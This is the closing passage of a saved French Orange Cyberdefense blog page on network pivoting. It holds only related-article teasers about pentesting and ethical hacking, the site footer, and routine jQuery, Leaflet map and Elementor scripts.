            <h2 class="mt-5">Sur le même sujet</h2>

            <div class="row" id="slick-related">
                <!--fwp-loop-->
                    <div class="my-4 col-12 col-md-6 col-lg-3 post-188840 blog type-blog status-publish has-post-thumbnail hentry themes-ethical_hacking">
                        <article itemscope="" itemtype="https://schema.org/Article" id="post-188840" class="card">
            <a href="https://cyberdefense.orange.com/fr/blog/tout-savoir-sur-le-pentest-sur-smartphone/" tabindex="-1" aria-hidden="true" class="card-img-top">
            <img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/pentest-mobile-325x150.png" class="img-fluid wp-post-image" alt="" itemprop="image" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/11/pentest-mobile-325x150.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/11/pentest-mobile-650x300.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/11/pentest-mobile-240x110.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/11/pentest-mobile-515x240.png 515w" sizes="(max-width: 325px) 100vw, 325px" width="325" height="150">        </a>
    
    <div class="card-body">
        <h3 itemprop="name" class="card-title h4">
            <a itemprop="url" href="https://cyberdefense.orange.com/fr/blog/tout-savoir-sur-le-pentest-sur-smartphone/">
                Tout savoir sur le pentest sur smartphone            </a>
                    </h3>

                <p itemprop="description" class="card-text">
            33% des entreprises admettent avoir connu une attaque via 
smartphone en 2018[1]. Une situation qui les poussent à davantage 
protéger leur flotte mobile. Première étape de cette sécurisation […]   
     </p>
    </div>
</article>
                    </div>
                                        <div class="my-4 col-12 col-md-6 col-lg-3 post-177357 blog type-blog status-publish has-post-thumbnail hentry themes-ethical_hacking themes-metiers_de_la_cyber">
                        <article itemscope="" itemtype="https://schema.org/Article" id="post-177357" class="card">
            <a href="https://cyberdefense.orange.com/fr/blog/focus-sur-le-metier-de-pentester/" tabindex="-1" aria-hidden="true" class="card-img-top">
            <img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/pentest-ahmad-325x150.png" class="img-fluid wp-post-image" alt="" itemprop="image" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-ahmad-325x150.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-ahmad-650x300.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-ahmad-240x110.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-ahmad-515x240.png 515w" sizes="(max-width: 325px) 100vw, 325px" width="325" height="150">        </a>
    
    <div class="card-body">
        <h3 itemprop="name" class="card-title h4">
            <a itemprop="url" href="https://cyberdefense.orange.com/fr/blog/focus-sur-le-metier-de-pentester/">
                Focus sur le métier de pentester            </a>
                    </h3>

                <p itemprop="description" class="card-text">
            Ahmad Abbes est pentester chez Orange Cyberdefense. 
Passionné par son métier, il s’est peu à peu spécialisé dans les tests 
d’intrusion en secteur industriel, où tout est encore […]        </p>
    </div>
</article>
                    </div>
                                        <div class="my-4 col-12 col-md-6 col-lg-3 post-177181 blog type-blog status-publish has-post-thumbnail hentry themes-ethical_hacking">
                        <article itemscope="" itemtype="https://schema.org/Article" id="post-177181" class="card">
            <a href="https://cyberdefense.orange.com/fr/blog/ethical-hacking-quelles-perspectives/" tabindex="-1" aria-hidden="true" class="card-img-top">
            <img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/avenir-eh-325x150.png" class="img-fluid wp-post-image" alt="" itemprop="image" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/avenir-eh-325x150.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/avenir-eh-650x300.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/avenir-eh-240x110.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/avenir-eh-515x240.png 515w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/avenir-eh-150x68.png 150w" sizes="(max-width: 325px) 100vw, 325px" width="325" height="150">        </a>
    
    <div class="card-body">
        <h3 itemprop="name" class="card-title h4">
            <a itemprop="url" href="https://cyberdefense.orange.com/fr/blog/ethical-hacking-quelles-perspectives/">
                Ethical hacking : quelles perspectives ?            </a>
                    </h3>

                <p itemprop="description" class="card-text">
            A l’occasion du &nbsp;mois européen de la cybersécurité, 
Fabien Spagnolo,&nbsp;head of ethical hacking&nbsp;chez Orange 
Cyberdefense partage sa vision du&nbsp;hacking&nbsp;éthique et de son 
avenir. Talonner les cyber-attaquants pour, non […]        </p>
    </div>
</article>
                    </div>
                                        <div class="my-4 col-12 col-md-6 col-lg-3 post-176998 blog type-blog status-publish has-post-thumbnail hentry themes-ethical_hacking themes-securite_industrielle">
                        <article itemscope="" itemtype="https://schema.org/Article" id="post-176998" class="card">
            <a href="https://cyberdefense.orange.com/fr/blog/audit-technique-et-test-dintrusion-en-environnement-industriel/" tabindex="-1" aria-hidden="true" class="card-img-top">
            <img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/pentest-secu-indus-325x150.gif" class="img-fluid wp-post-image" alt="" itemprop="image" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-secu-indus-325x150.gif 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-secu-indus-650x300.gif 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-secu-indus-240x110.gif 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/pentest-secu-indus-515x240.gif 515w" sizes="(max-width: 325px) 100vw, 325px" width="325" height="150">        </a>
    
    <div class="card-body">
        <h3 itemprop="name" class="card-title h4">
            <a itemprop="url" href="https://cyberdefense.orange.com/fr/blog/audit-technique-et-test-dintrusion-en-environnement-industriel/">
                Audit technique et test d’intrusion en environnement industriel            </a>
                    </h3>

                <p itemprop="description" class="card-text">
            Comment mène-t-on un audit technique sur un système 
industriel ? Analyse et méthodologie de Claire Vacherot et Marie Forrat,
 auditrices techniques chez Orange Cyberdefense. Pourquoi auditer 
techniquement un […]        </p>
    </div>
</article>
                    </div>
                                </div>
        </aside>
    

<footer role="contentinfo" id="footer" class="navbar navbar-expand-md px-0 py-0 bg-light-o">
    <div class="o-footer mt-0 mt-md-4">
                <div class="o-footer-bottom bg-dark border-0 py-0 py-md-2">
            <div class="container">
                <div class="d-flex flex-column-reverse flex-md-row">
                    <ul class="navbar-nav flex-row mb-4 mb-md-2"><li class="nav-item"><a target="_blank" rel="noopener noreferrer" title="Infos légales (ouvre un nouvel onglet)" href="https://www.orange.com/fr/Footer/Mentions-legales" class="nav-link">Infos légales</a></li><li class="nav-item"><a target="_blank" rel="noopener noreferrer" title="Données personnelles (ouvre un nouvel onglet)" href="https://www.orange.com/fr/Footer/Notice-sur-la-Protection-des-Donnees-personnelles" class="nav-link">Données personnelles</a></li><li class="nav-item"><a href="https://cyberdefense.orange.com/fr/nos-certifications/" class="nav-link">Nos certifications</a></li><li class="nav-item"><a href="https://cyberdefense.orange.com/fr/accueil/contactez-nous/" class="nav-link">Contactez-nous</a></li></ul><ul class="navbar-nav ml-md-auto px-md-3 px-md-0 navbar-social flex-row flex-wrap justify-content-center"><li class="nav-item"><a target="_blank" rel="noopener noreferrer" title="Orange Cyberdefense sur Twitter (ouvre un nouvel onglet)" href="https://twitter.com/orangecyberdef" class="nav-link">Orange Cyberdefense sur Twitter</a></li><li class="nav-item"><a target="_blank" rel="noopener noreferrer" title="Orange Cyberdefense sur LinkedIn (ouvre un nouvel onglet)" href="https://fr.linkedin.com/company/orange-cyberdefense" class="nav-link">Orange Cyberdefense sur LinkedIn</a></li></ul>                </div>
            </div>
        </div>
    </div>
</footer><!-- / contentinfo -->

<a href="#" class="o-scroll-up is-fixed" title="Retour en haut de page" style="display: inline;">
    <span class="o-scroll-up-text sr-only">Retour en haut de page</span>
    <span class="o-scroll-up-icon" aria-hidden="true"></span>
</a>

		<script type="text/html" id="tmpl-osm-marker-input">
			<div class="locate">
				<a class="dashicons dashicons-location" data-name="locate-marker"><span class="screen-reader-text">Locate Marker</span></a>
			</div>
			<div class="input">
				<input type="text" data-name="label" />
			</div>
			<div class="tools">
				<a class="acf-icon -minus small light acf-js-tooltip" href="#" data-name="remove-marker" title="Remove Marker"></a>
			</div>
		</script>
		<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/jquery_002.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/cops-fSelect.js"></script>
<script type="text/javascript">
/* <![CDATA[ */
var facet = {"loading":"Loading\u2026"};
/* ]]> */
</script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/cops-facet.js"></script>
<script type="text/javascript">
/* <![CDATA[ */
var cops_event_calendar_object = {"ajax_url":"https:\/\/cyberdefense.orange.com\/wp-admin\/admin-ajax.php","action":"cops_event_calendar_month"};
/* ]]> */
</script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/ajax.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/cops.js" async="async"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/slick.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/tealium.js" async="async"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/popper-1.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/boosted.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/leaflet.js"></script>
<script type="text/javascript">
            var tileServer = 'https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}.png';
            var copyright  = '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors, &copy; <a href="https://cartodb.com/attributions">CartoDB</a>';
            
            function createIcon() {
                var svg = '<path fill="#f16e00" d="M 32.9,0 C 14.7,0 0,14.7 0,32.9 0,58.4 32.9,90 32.9,90 32.9,90 65.8,58.3 65.8,32.9 65.8,14.7 51.1,0 32.9,0 Z m 0,48 c -8.3,0 -15,-6.7 -15,-15 0,-8.3 6.7,-15 15,-15 8.3,0 15,6.7 15,15 0,8.3 -6.7,15 -15,15 z"/>';

                return L.divIcon({
                    className: 'leaflet-marker-icon',
                    html: '<svg xmlns="https://www.w3.org/2000/svg" width="30" height="40" viewBox="0 0 65.800003 90" focusable="false">' + svg + '</svg>',
                    iconSize: [30, 40]
                });
            }
            
            function initOpenStreetMap( el ) {
                el.style.height = el.dataset.height + 'rem';
                var pins = JSON.parse(el.dataset.markers);
                var zoom = parseFloat(el.dataset.zoom);
                var bounds  = [];
                var markers = [];
                
                Object.keys(pins).forEach(function(el) {
                    var pin = pins[el];

                    var marker = L.marker([
                        parseFloat(pin.lat),
                        parseFloat(pin.lng)
                    ], {icon: createIcon()});
                    markers.push(marker);

                    bounds.push([
                        parseFloat(pin.lat),
                        parseFloat(pin.lng)
                    ]);

                    var content = '';
                    if (pin.title.length > 0) {
                        content += '<h3 class="text-primary">' + pin.title + '</h3>';
                    }
                    if (pin.content.length > 0) {
                        content += '<p>' + pin.content + '</p>';
                    }
                    if (pin.address.length > 0) {
                        content += '<address class="text-muted">' + pin.address + '</address>';
                    }

                    marker.bindPopup(content);
                });
                
                var center = new L.latLngBounds(bounds);
                var points = new L.featureGroup(markers);
                
                var map = L.map(el.id, {
                    scrollWheelZoom: false,
                    zoomSnap: 0.1
                }).setView(center.getCenter(), zoom);
                
                points.addTo(map);

                L.tileLayer(tileServer, {attribution: copyright}).addTo(map);                      
            };
            
            document.addEventListener('DOMContentLoaded', function() {                           
                var maps = document.getElementsByClassName('openstreetmap');
                Array.prototype.forEach.call(maps, function(el, i){
                    initOpenStreetMap(el);
                });
                
                var links = document.querySelectorAll('.openstreetmap a');
                Array.prototype.forEach.call(links, function(el, i){
                    el.setAttribute('aria-hidden', 'true');
                });
                
                jQuery(window).on('elementor/frontend/init', function() {
                    elementorFrontend.hooks.addAction( 'frontend/element_ready/wp-widget-cops-openstreetmap-widget.default', function( scope ) {
                         let mapId = scope.children().find('.openstreetmap').attr('id');
                         let map = document.getElementById(mapId);
                         initOpenStreetMap(map);
                    });
                });
            });
</script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/wp-embed.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/frontend-modules.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/jquery.js"></script>
<script type="text/javascript">
var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/cyberdefense.orange.com\/wp-admin\/admin-ajax.php","nonce":"ec8ab67c97","shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"google":{"title":"Google+","has_counter":true},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"delicious":{"title":"Delicious"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"}},"facebook_sdk":{"lang":"fr_FR","app_id":""}};
</script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/frontend.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/position.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/dialog.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/waypoints.js"></script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/swiper.js"></script>
<script type="text/javascript">
var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"version":"2.7.3","urls":{"assets":"https:\/\/cyberdefense.orange.com\/wp-content\/plugins\/elementor\/assets\/"},"settings":{"page":[],"general":{"elementor_stretched_section_container":"body","elementor_global_image_lightbox":"yes","elementor_enable_lightbox_in_editor":"yes"}},"post":{"id":177416,"title":"Etat de l\u2019art du pivoting r\u00e9seau en 2019","excerpt":""}};
</script>
<script type="text/javascript" src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/frontend_002.js"></script><span id="elementor-device-mode" class="elementor-screen-only"></span>
<script>if ('undefined' != typeof FWP_HTTP) FWP_HTTP.lang = 'fr';</script>

</body></html>